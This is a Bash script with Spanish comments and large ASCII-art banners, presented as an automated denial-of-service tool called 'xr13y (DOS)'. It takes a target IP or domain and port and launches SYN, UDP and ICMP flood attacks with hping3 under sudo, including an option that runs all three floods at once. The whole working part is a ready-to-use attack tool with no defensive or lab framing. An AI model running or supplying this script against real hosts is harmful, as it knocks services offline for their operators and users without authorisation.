#!/bin/bash

RED='\033[0;31m'
RED_DARK='\033[0;91m'
RED_DARKEST='\033[2;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

echo -e "${YELLOW}                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                    :                                                           .:                  
                   .@.                                                          :#.                 
                  :@@.                                                          :@@.                
                 .@@+                                                           .%@@.               
                -@@@.                                                            -@@@.              
               :@@@+                                                             .@@@@.             
              .@@@@-                                                              =@@@@             
              #@@@@:                                                              -@@@@-            
             .@@@%@-                                                              =@@@@@            
             .@@@@%+                                                             .@%@@@@.           
             .@@@@@@.${NC}${RED_DARK}                            .*+${NC}${YELLOW}                             =@@@@@@.           
             .@@@@@+#....${NC}${RED_DARK}                     ::-@#.-.${NC}${YELLOW}                          :+@@@@@@.           
             .@@@@@@%-...${NC}${RED_DARK}                    .*+:=@@--*+.${NC}${YELLOW}                      .=@@@@@@+            
              -@@@@@@@...${NC}${RED_DARK}                  ..@%@=#@@*-@*#.${NC}${YELLOW}                    .=@@@@@@@.            
               +@@@@@@@@.${NC}${RED_DARK}                :+-@@@@@@@@#%@@@*:-.${NC}${YELLOW}                -@@@@@@@@-             
               .%@@@@@@@@@-${NC}${RED_DARK}             :#:#@@@@@@@@@:@@@@:#=:${NC}${YELLOW}            .*@@@@@@@@@*              
                .@@@@@@@@@@#:${NC}${RED_DARK}          .**+@@@@@@@@@@@*@@@:-%:${NC}${YELLOW}           :@@@@@@@@%@+.              
                 .#@@@@@@@@@#.${NC}${RED_DARK}        .:+%*@@@@@@@@@@@@@@@+%+#:${NC}${YELLOW}         =%@@@@@@@@@+                
                   +@##@@@@@@%.${NC}${RED_DARK}       -#@@=@@%@@@@@@@@@=#@#*@#=-${NC}${YELLOW}       :@@@@@@@##%:                 
                    .#.#:@@@@@*${NC}${RED_DARK} .....-*@@%@@@@@@#@@@@@@@@@@@#@%*...${NC}${YELLOW}    @@@@@@++-%.${NC}${RED_DARK}                  
                   :@+::.#=#@@@...::=#@@@@@@@@@@@@@@@@@@@@@@@@@%*=-:..=@@@+%+.-:#%.                 
                    :%#+. .##-+..+***@@%*@@@@@@@@@@@@@@@@@@@@++@@%%*=.--+%*...*%#..                 
                    :-=%@. ...@:%%@@@@@@@@@@@%@@@@@@@@@@%@@@@@@@@@@@@%-#....-*@-*..                 
                    :=.*#*:-=+#@@@@@@@@@@@@@@@@#:+**-+#%@@@@@@@@@@@@@@@*==:+*%=.#..                 
                    =+.:@=#:+#@@@@@@@@@@@@@@@@@@@@-=@@@@@@@@@@@@@@@@@@@@%:=-*#.:+-.                 
                   .%=..%*:+:%%@%*@@%@+@@@@@@@@@%*+@+@@@@@@@@@@*@%@@*+@%=.+=#=..*+.                 
                   .%+..*#-.:#:+@--@@@@@@@@@@@@@@=@@*@@@%@@@@@@@@@%:*@+.=::+%-..#+.                 
                    -%- .#=*+==..:+#%@@@@@@@@@@@=%@@*%@@@@@@@@@@@%+*..:===***..+%:.                 
                    .%%.:%=+@@%+*. .-@+@@@@@@%@.#@@@@::=@@@@@@@*@...-+#@@@+*%:-@#..                 
                     :%-#=.@@@@@=      .-++++-.#@@@@@@=.-+++=:..   ..%@@@@#.+=+*.                   
                      .#..@@@@%#*.      .......-@@@@@@..........   .:#*@@@@#.:#.                    
                      .+.*@%@@@@@@@@@@@@-....*=.@@@@@-:**....+@@@@@@@@@@@@%@-=+.                    
                      .+.#@%@@@@@@@@@@@@@@@@:#@=#@@@@.*@**@@@@@@@@@@@@@@@@#@-==.                    
                        .-@*@@@@@@@@@@@@@@@@@@#@@@@@@-@*@@@@@@@@@@@@@@@@@@%@....                    
                          :@@==@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@*%:*@@...                      
                          .#@@@..%@@@%%#-.%@@@@@@@@@@@@@@@@+.=@#@@@@+.-@@@*.                        
                           %@@*-+=:..--+#=@@@@@@@@@@@@@@@@@+++*::.::=++*@@*.                        
                           *@@@%.:%@@@@@@@#==-.*@@@@@#+:-==%@@@@@@@%.:@@@@-.                        
                           :@@@:...+@%*@@@@@@@#-%@@@@#-%@@@@@@%*@@-...@@@@.                         
                            +@@@*:..-@@+:@%@@@@@@@@@@@@@@@@@@:#@@...+*@@@..                         
                             -@@@#=.@@@@..:*-#@@@@@@@@@@+*+:.+=@@@.=@@@*-..                         
                              .@#-*@@@#:*..@#@##@*:+#@-@%%@..--@@@@==@#......                       
                             .+@@@@@%:#*%....-*=@@*@@%-*:...:%=+-@@@@@@=.....                       
                                .@*=+##%@@..      ..      .=@@=#@=##+........                       
                                 .*@%@@%*@@=*...........:=*@%@+@@%@+...                             
                                   .*@@@#%@@@@@@@@*@@=@=@*@@#%@@@-...                               
                                    .@@@@+-#@@@@@@@@@@@@@@+=*@@@-..                                 
                                     .@@@@@@@#=-:::::--=%@@@@@@#..                                  
                                      -@@#+-:%@@@@@@@@@@*.-*%@@...                                  
                                       .@@@@@@@@@@@@@@@@@@@@@%..                                    
                                         -@@@@@#:.  .-%@@@@#..                                      
                                              ....  .........                                       
                                                                                                                                                                                

                       ██▓     ▒█████   ▄▄▄      ▓█████▄  ██▓ ███▄    █   ▄████                
                      ▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒               
                      ▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░               
                      ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓               
                      ░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒ ██▓  ██▓  ██▓ 
                      ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒  ▒▓▒  ▒▓▒  ▒▓▒ 
                      ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░  ░▒   ░▒   ░▒  
                        ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░  ▒ ░   ░   ░ ░ ░ ░   ░  ░    ░    ░   
                          ░  ░    ░ ░        ░  ░   ░     ░           ░       ░   ░    ░    ░  
                                                  ░                               ░    ░    ░  ${NC}"

                                                                                                    
#...................................................

sleep 5
clear 
echo -e "${YELLOW}
                       ████   ████████            
                      ░░███  ███░░░░███           
 █████ █████ ████████  ░███ ░░░    ░███ █████ ████
░░███ ░░███ ░░███░░███ ░███    ██████░ ░░███ ░███ 
 ░░░█████░   ░███ ░░░  ░███   ░░░░░░███ ░███ ░███ 
  ███░░░███  ░███      ░███  ███   ░███ ░███ ░███ 
 █████ █████ █████     █████░░████████  ░░███████ 
░░░░░ ░░░░░ ░░░░░     ░░░░░  ░░░░░░░░    ░░░░░███  ${BLUE}(DOS)${NC}${YELLOW}
                                         ███ ░███ 
                                        ░░██████  
                                         ░░░░░░   
${NC}"


# Función para mostrar el banner de ayuda
function mostrar_ayuda() {
    echo -e "${GREEN}Uso:${NC} $0 [opciones]"
    echo -e "${YELLOW}Opciones:${NC}"
    echo -e "  ${BLUE}-i${NC} <IP_destino> o <dominio> : Especifica la IP o dominio del objetivo"
    echo -e "  ${BLUE}-p${NC} <puerto>                : Especifica el puerto del objetivo (por defecto 80)"
    echo -e "  ${BLUE}-t${NC} <tipo>                  : Tipo de ataque (syn, udp, icmp, all)"
    echo -e "  ${BLUE}-I${NC} <intervalo>              : Intervalo entre paquetes en microsegundos (opcional)"
    echo -e "  ${BLUE}-h${NC}                         : Mostrar esta ayuda"
    echo -e "${YELLOW}Ejemplo de uso:${NC} $0 -i www.ejemplo.com -p 80 -t syn"
}

# Variables predeterminadas
PUERTO=80
TIPO="syn"
INTERVALO=0

# Función para mostrar el banner de inicio
function banner_inicio() {
    echo -e "${RED}"
    echo "======================================"
    echo "         Ataque DoS Automático        "
    echo "======================================"
    echo -e "${NC}"
}

# Función para convertir un dominio en una IP
function convertir_dominio_a_ip() {
    local dominio="$1"
    local ip=$(dig +short "$dominio" | tail -n 1)

    if [ -z "$ip" ]; then
        echo -e "${RED}Error: No se pudo resolver el dominio ${dominio}.${NC}"
        exit 1
    fi

    echo "$ip"
}

# Función para realizar el ataque
function ejecutar_ataque() {
    local tipo_ataque="$1"
    local ip_destino="$2"
    local puerto="$3"
    local intervalo="$4"

    echo -e "${YELLOW}Iniciando ataque ${tipo_ataque} a $ip_destino en el puerto $puerto...${NC}"

    case "$tipo_ataque" in
        syn)
            sudo hping3 -S --flood --interval u$intervalo -p $puerto $ip_destino
            ;;
        udp)
            sudo hping3 --udp --flood --interval u$intervalo -p $puerto $ip_destino
            ;;
        icmp)
            sudo hping3 --icmp --flood --interval u$intervalo $ip_destino
            ;;
        all)
            sudo hping3 -S --flood --interval u$intervalo -p $puerto $ip_destino &
            sudo hping3 --udp --flood --interval u$intervalo -p $puerto $ip_destino &
            sudo hping3 --icmp --flood --interval u$intervalo $ip_destino &
            wait
            ;;
        *)
            echo -e "${RED}Tipo de ataque no reconocido.${NC}"
            exit 1
            ;;
    esac
}

# Validar parámetros
if [ "$#" -eq 0 ]; then
    mostrar_ayuda
    exit 0
fi

# Procesar opciones de línea de comandos
while getopts ":i:p:t:I:h" opt; do
    case ${opt} in
        i)
            IP_DESTINO="$OPTARG"
            ;;
        p)
            PUERTO="$OPTARG"
            ;;
        t)
            TIPO="$OPTARG"
            ;;
        I)
            INTERVALO="$OPTARG"
            ;;
        h)
            mostrar_ayuda
            exit 0
            ;;
        \?)
            echo -e "${RED}Opción inválida: -$OPTARG${NC}" 1>&2
            mostrar_ayuda
            exit 1
            ;;
        :)
            echo -e "${RED}Opción -$OPTARG requiere un valor.${NC}" 1>&2
            mostrar_ayuda
            exit 1
            ;;
    esac
done

# Validar que se haya proporcionado la IP o dominio
if [ -z "$IP_DESTINO" ]; then
    echo -e "${RED}Error: Debes especificar una IP o dominio de destino.${NC}"
    mostrar_ayuda
    exit 1
fi

# Convertir dominio a IP si es necesario
if [[ "$IP_DESTINO" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo -e "${GREEN}Usando la IP proporcionada: ${IP_DESTINO}${NC}"
else
    echo -e "${GREEN}Resolviendo el dominio ${IP_DESTINO} a una IP...${NC}"
    IP_DESTINO=$(convertir_dominio_a_ip "$IP_DESTINO")
    echo -e "${GREEN}IP resuelta: ${IP_DESTINO}${NC}"
fi

# Mostrar el banner de inicio
banner_inicio

# Ejecutar el ataque
ejecutar_ataque "$TIPO" "$IP_DESTINO" "$PUERTO" "$INTERVALO"

